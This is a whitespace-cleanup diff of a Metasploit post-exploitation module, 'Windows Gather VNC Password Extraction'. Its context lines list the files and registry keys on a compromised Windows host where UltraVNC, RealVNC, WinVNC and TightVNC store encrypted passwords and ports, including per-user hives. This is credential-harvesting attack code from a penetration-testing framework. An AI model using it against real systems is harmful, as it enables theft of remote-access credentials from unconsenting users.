@@ -26,7 +26,7 @@ class Metasploit3 < Msf::Post
 	def initialize(info={})
 		super( update_info( info,
 				'Name'          => 'Windows Gather VNC Password Extraction',
-				'Description'   => %q{ 
+				'Description'   => %q{
 					This module extract DES encrypted passwords in known VNC locations
 				},
 				'License'       => MSF_LICENSE,
@@ -104,63 +104,63 @@ class Metasploit3 < Msf::Post
 		locations = []
 
 		#Checks
-		locations << {:name => 'UltraVNC', 
+		locations << {:name => 'UltraVNC',
 			:check_file => session.fs.file.expand_path("%PROGRAMFILES%")+'\\UltraVNC\\ultravnc.ini',
 			:pass_variable => 'passwd=',
 			:viewonly_variable => 'passwd2=',
 			:port_variable => 'PortNumber='}
 
-		locations << {:name => 'WinVNC3_HKLM', 
+		locations << {:name => 'WinVNC3_HKLM',
 			:check_reg => 'HKLM\\Software\\ORL\\WinVNC3',
 			:pass_variable => 'Password',
 			:port_variable => 'PortNumber'}
 
-		locations << {:name => 'WinVNC3_HKCU', 
+		locations << {:name => 'WinVNC3_HKCU',
 			:check_reg => 'HKCU\\Software\\ORL\\WinVNC3',
 			:pass_variable => 'Password',
 			:port_variable => 'PortNumber'}
 
-		locations << {:name => 'WinVNC3_HKLM_Default', 
+		locations << {:name => 'WinVNC3_HKLM_Default',
 			:check_reg => 'HKLM\\Software\\ORL\\WinVNC3\\Default',
 			:pass_variable => 'Password',
 			:port_variable => 'PortNumber'}
 
-		locations << {:name => 'WinVNC3_HKCU_Default', 
+		locations << {:name => 'WinVNC3_HKCU_Default',
 			:check_reg => 'HKCU\\Software\\ORL\\WinVNC3\\Default',
 			:pass_variable => 'Password',
 			:port_variable => 'PortNumber'}
 
-		locations << {:name => 'WinVNC_HKLM_Default', 
+		locations << {:name => 'WinVNC_HKLM_Default',
 			:check_reg => 'HKLM\\Software\\ORL\\WinVNC\\Default',
 			:pass_variable => 'Password',
 			:port_variable => 'PortNumber'}
 
-		locations << {:name => 'WinVNC_HKCU_Default', 
+		locations << {:name => 'WinVNC_HKCU_Default',
 			:check_reg => 'HKCU\\Software\\ORL\\WinVNC\\Default',
 			:pass_variable => 'Password',
 			:port_variable => 'PortNumber'}
 
-		locations << {:name => 'WinVNC4_HKLM', 
+		locations << {:name => 'WinVNC4_HKLM',
 			:check_reg => 'HKLM\\Software\\RealVNC\\WinVNC4',
 			:pass_variable => 'Password',
 			:port_variable => 'PortNumber'}
 
-		locations << {:name => 'WinVNC4_HKCU', 
+		locations << {:name => 'WinVNC4_HKCU',
 			:check_reg => 'HKCU\\Software\\RealVNC\\WinVNC4',
 			:pass_variable => 'Password',
 			:port_variable => 'PortNumber'}
 
-		locations << {:name => 'RealVNC_HKLM', 
+		locations << {:name => 'RealVNC_HKLM',
 			:check_reg => 'HKLM\\Software\\RealVNC\\Default',
 			:pass_variable => 'Password',
 			:port_variable => 'PortNumber'}
 
-		locations << {:name => 'RealVNC_HKCU', 
+		locations << {:name => 'RealVNC_HKCU',
 			:check_reg => 'HKCU\\Software\\RealVNC\\Default',
 			:pass_variable => 'Password',
 			:port_variable => 'PortNumber'}
 
-		locations << {:name => 'TightVNC_HKLM', 
+		locations << {:name => 'TightVNC_HKLM',
 			:check_reg => 'HKLM\\Software\\TightVNC\\Server',
 			:pass_variable => 'Password',
 			:port_variable => 'RfbPort'}
@@ -172,23 +172,23 @@ class Metasploit3 < Msf::Post
 
 		userhives=load_missing_hives()
 		userhives.each do |hive|
-			next if hive['HKU'] == nil 
-			locations << {:name => "RealVNC_#{hive['SID']}", 
+			next if hive['HKU'] == nil
+			locations << {:name => "RealVNC_#{hive['SID']}",
 				:check_reg => "#{hive['HKU']}\\Software\\RealVNC\\Default",
 				:pass_variable => 'Password',
 				:port_variable => 'PortNumber'}
 
-			locations << {:name => "WinVNC4_#{hive['SID']}", 
+			locations << {:name => "WinVNC4_#{hive['SID']}",
 				:check_reg => "#{hive['HKU']}\\Software\\RealVNC\\WinVNC4",
 				:pass_variable => 'Password',
 				:port_variable => 'PortNumber'}
 
-			locations << {:name => "WinVNC_#{hive['SID']}_Default", 
+			locations << {:name => "WinVNC_#{hive['SID']}_Default",
 				:check_reg => "#{hive['HKU']}\\Software\\ORL\\WinVNC\\Default",
 				:pass_variable => 'Password',
 				:port_variable => 'PortNumber'}
 
-			locations << {:name => "WinVNC3_#{hive['SID']}_Default", 
+			locations << {:name => "WinVNC3_#{hive['SID']}_Default",
 				:check_reg => "#{hive['HKU']}\\Software\\ORL\\WinVNC3\\Default",
 				:pass_variable => 'Password',
 				:port_variable => 'PortNumber'}
